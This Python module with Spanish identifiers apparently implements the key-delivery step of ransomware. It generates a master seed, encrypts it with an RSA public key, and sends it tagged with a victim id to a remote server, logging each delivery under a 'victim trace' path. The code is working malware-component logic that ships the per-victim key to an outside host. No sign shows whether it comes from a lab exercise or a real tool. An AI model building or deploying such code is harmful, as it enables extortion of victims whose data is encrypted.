from pathlib import Path

from Crypto.PublicKey import RSA

from generador_semillas import generar_semilla_maestra
from protocolo.mensajes import TIPO_CONFIRMACION, TIPO_ENTREGA, TIPO_ERROR, conectar, emitir, leer
from protocolo.oaep import abrir

TRAZA = Path("/datos/traza-victima/entrega")


class EntregaRechazada(Exception):
    def __init__(self, motivo):
        self.motivo = motivo
        super().__init__(motivo)


def _trazar(id_v, resultado, detalle):
    TRAZA.parent.mkdir(parents=True, exist_ok=True)
    with TRAZA.open("a", encoding="utf-8") as salida:
        salida.write(f"entrega {id_v.hex()} {resultado} {detalle}\n")


def enviar(id_v, cifrado, destino):
    with conectar(destino) as conexion:
        conexion.sendall(emitir(TIPO_ENTREGA, id_v + cifrado))
        tipo, cuerpo = leer(conexion)
    if tipo == TIPO_CONFIRMACION and cuerpo == id_v:
        _trazar(id_v, "ok", "confirmada")
        return cuerpo
    if tipo == TIPO_ERROR and cuerpo[:16] == id_v:
        motivo = cuerpo[16:].decode("utf-8")
        _trazar(id_v, "error", motivo)
        raise EntregaRechazada(motivo)
    raise EntregaRechazada("respuesta")


def entregar(id_v, pk_s_der, destino):
    sv = generar_semilla_maestra()
    cifrado = abrir(RSA.import_key(pk_s_der)).encrypt(sv)
    return sv, enviar(id_v, cifrado, destino)
